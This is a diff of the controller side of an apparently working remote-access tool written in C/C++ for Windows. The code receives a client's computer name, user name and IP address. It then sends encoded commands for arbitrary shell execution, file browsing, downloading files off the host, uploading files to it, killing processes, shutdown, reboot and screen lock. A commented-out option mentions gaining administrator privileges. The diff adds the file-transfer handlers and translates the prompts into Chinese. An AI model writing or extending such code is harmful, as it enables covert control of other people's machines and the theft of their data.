@@ -8,7 +8,7 @@ int main()
 
 	SOCKET serfd = CreatServerScoket();
 
-	cout << "wait client connect...\n";
+	printf("等待连接...\n");
 
 	SOCKET clifd = accept(serfd, NULL, NULL);	//如果有客户端请求连接
 	if (clifd == INVALID_SOCKET)
@@ -20,28 +20,28 @@ int main()
 	if (recv(clifd, buf, BUFSIZ, 0) > 0)//接受连接成功并输出
 	{
 		decode(buf);
-		cout << buf << endl;
+		printf("%s\n", buf);
 	}
 	memset(buf, 0, sizeof(buf));//缓冲区初始化，防止重复输出
 
 	if (recv(clifd, buf, BUFSIZ, 0) > 0)//计算机名
 	{
 		decode(buf);
-		cout << "PCName is :" << buf << endl;
+		printf("计算机名为 :%s\n", buf);
 	}
 	memset(buf, 0, sizeof(buf));
 
 	if (recv(clifd, buf, BUFSIZ, 0) > 0)//用户名
 	{
 		decode(buf);
-		cout << "UserName is :" << buf << endl;
+		printf("用户名为 :%s\n", buf);
 	}
 	memset(buf, 0, sizeof(buf));
 
 	if (recv(clifd, buf, BUFSIZ, 0) > 0)//IP地址
 	{
 		decode(buf);
-		cout << "IP is :" << buf << endl;
+		printf("IP为  :%s\n", buf);
 	}
 	memset(buf, 0, sizeof(buf));
 
@@ -53,8 +53,8 @@ int main()
 		rewind(stdin);
 		if (recv(clifd, beat, 20, 0) > 0)
 		{
-			decode(beat);
-			cout << beat << endl;
+			//decode(beat);
+			printf("%s\n", beat);
 		}
 	}
 	close_Socket();
@@ -67,58 +67,123 @@ int process(SOCKET clifd)
 	char sendbuf[BUFSIZ] = { 0 };
 	while (true)
 	{
-		cout << "Enter prompt: " << endl;
-		//cout << "1.  filebrowse: File browsing" << endl;
-		cout << "2.  shell: Execute shell instructions" << endl;
-		//cout << "3.  download: File download" << endl;
-		//cout << "4.  upload: File upload" << endl;
-		//cout << "5.  upright: Get administrator privileges" << endl;
-		cout << "6.  kill: Kill the terminal" << endl;
-		cout << "7.  shutdown: shutdown the pc" << endl;
-		cout << "8.  reboot: Restart the computer" << endl;
-		cout << "9.  cancel: Cancel shutdown" << endl;
-		cout << "10. lock: Lock Screen" << endl;
-		cout << "Please enter the corresponding instruction: " << endl;
+		printf("请输入正确的指令: \n");
+		printf("输入 -help 获得输入提示：\n\n");
 		rewind(stdin);
-		cin >> code;//输入并加密指令
+		scanf("%s", code);//输入并加密指令
 		encode(code);
 		send(clifd, code, 50, 0);
 		decode(code);
-		if (!strcmp(code, "filebrowse"))
+		if (!strcmp(code, "-help"))
+		{
+			printf("\n输入提示\n");
+			printf("1. filebrowse:			文件浏览\n");
+			printf("2. shell:			执行shell指令\n");
+			printf("3. download:			文件下载\n");
+			printf("4. upload:			文件上传\n");
+			//printf("5. upright:			提权\n");
+			printf("6. kill:			杀死进程\n");
+			printf("7. shutdown:			关机\n");
+			printf("8. reboot:			重启\n");
+			printf("9. cancel:			取消关机\n");
+			printf("10.lock:			锁屏\n");
+		}
+		else if (!strcmp(code, "filebrowse"))
 		{
 			char file[Row] = { 0 };//定义、初始化、输入提示
-			char path[100] = { 0 };
+			char path[50] = { 0 };
 
-			cout << "please input the path" << endl;
-			cout << "use two '\\'" << endl;
-			cout << "just as 'D:\\\\Games', check the files in Games directory" << endl;
-			cout << "and 'D:\\' check the files under drive D. " << endl;
-
-			rewind(stdin);
-			cin >> path;//输入、加密并发送指令
+			printf("例如输入 'D:' 来获取D盘目录下的所有文件名\n");
+			cin >> path;
 			encode(path);
-			send(clifd, path, 100, 0);
-			do
+			send(clifd, path, 50, 0);
+			while (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
 			{
-				recv(clifd, file, Row, 0);
-				cout << file << endl;
-			} while (file[0] != 0);
-			continue;
+				if (sendbuf[0] == 0)
+				{
+					continue;
+				}
+				printf("%s\n", sendbuf);
+			}
 		}
-		else if (strcmp(code, "shell") == 0)
+		else if (!strcmp(code, "shell"))
 		{
 			char shell[BUFSIZ] = { 0 };
-			char res[BUFSIZ * 6] = { 0 };
-			cout << "Please enter the shell instruction: ";
+			char res[BUFSIZ * 10] = { 0 };
+			printf("请输入正确的shell指令: \n");
+			printf("如果指令错误，将会刷新，请重新选择shell后再次输入正确的指令.\n");
 			rewind(stdin);
-			cin >> shell;
+			scanf("%s", shell);
+			rewind(stdin);
 			encode(shell);
 			send(clifd, shell, BUFSIZ, 0);
-			if (recv(clifd, res, BUFSIZ * 6, 0) > 0)
+			rewind(stdin);
+			if (recv(clifd, res, BUFSIZ * 10, 0) > 0)
 			{
 				rewind(stdin);
 				//decode(res);
-				cout << res << endl;
+				printf("%s\n", res);
+			}
+			continue;
+		}
+		else if (!strcmp(code, "download"))
+		{
+			printf("请输入要下载的文件名:\n");
+			rewind(stdin);
+			scanf("%s", sendbuf);
+			send(clifd, sendbuf, BUFSIZ, 0);
+			ZeroMemory(sendbuf, sizeof(sendbuf));
+			recv(clifd, sendbuf, BUFSIZ, 0);
+			FILE* fp = fopen("D:\\vsfiles\\test\\x64\\Release\\file.txt", "w");
+			if (fp == NULL)
+			{
+				printf("文件打开失败");
+				continue;
+			}
+			int ret = recv(clifd, sendbuf, BUFSIZ, 0);
+
+			int write_length = fwrite(sendbuf, sizeof(char), ret, fp);
+			if (write_length < ret)
+			{
+				printf("文件写入失败!\n");
+				continue;
+			}
+			memset(sendbuf, 0, sizeof(sendbuf));   //清空接收缓存区
+			fclose(fp);
+			continue;
+		}
+		else if (!strcmp(code, "upload"))
+		{
+			printf("请输入要上传的文件名:\n");
+			rewind(stdin);
+			scanf("%s", sendbuf);
+			send(clifd, sendbuf, BUFSIZ, 0);
+			FILE* fp = fopen(sendbuf, "r");
+			if (fp == NULL)
+			{
+				printf("打开 %s 文件失败!\n", sendbuf);
+			}
+			else
+			{
+				char buffer[BUFSIZ];
+				printf("成功打开 %s 文件!\n", sendbuf);
+				ZeroMemory(buffer, BUFSIZ);
+				int file_block_length = 0;
+				//循环将文件file_name(fp)中的内容读取到buffer中
+				while ((file_block_length = fread(buffer, sizeof(char), BUFSIZ, fp)) > 0)
+				{
+
+					// 发送buffer中的字符串到客户端  
+					if (send(clifd, buffer, file_block_length, 0) < 0)
+					{
+						printf("文件 %s 发送失败!\n", sendbuf);
+						break;
+					}
+					//清空buffer缓存区
+					ZeroMemory(buffer, sizeof(buffer));
+				}
+				fclose(fp);  			//关闭文件描述符fp
+				printf("文件 %s 传输成功!\n", sendbuf);
 			}
 			continue;
 		}
@@ -128,7 +193,7 @@ int process(SOCKET clifd)
 			{
 				rewind(stdin);
 				decode(sendbuf);
-				cout << sendbuf << endl;
+				printf("%s\n", sendbuf);
 			}
 			rewind(stdin);
 			continue;
@@ -139,7 +204,7 @@ int process(SOCKET clifd)
 			{
 				rewind(stdin);
 				decode(sendbuf);
-				cout << sendbuf << endl;
+				printf("%s\n", sendbuf);
 			}
 			rewind(stdin);
 			continue;
@@ -150,7 +215,7 @@ int process(SOCKET clifd)
 			{
 				rewind(stdin);
 				decode(sendbuf);
-				cout << sendbuf << endl;
+				printf("%s\n", sendbuf);
 			}
 			rewind(stdin);
 			continue;
@@ -161,18 +226,19 @@ int process(SOCKET clifd)
 			{
 				rewind(stdin);
 				decode(sendbuf);
-				cout << sendbuf << endl;
+				printf("%s\n", sendbuf);
 			}
 			rewind(stdin);
 			continue;
 		}
 		else
 		{
-			cout << "error code" << endl;
+			printf("指令错误\n\n");
 			continue;
 			rewind(stdin);
 		}
 		ZeroMemory(code, sizeof(code));
+		rewind(stdin);
 	}
 	return 0;
 }
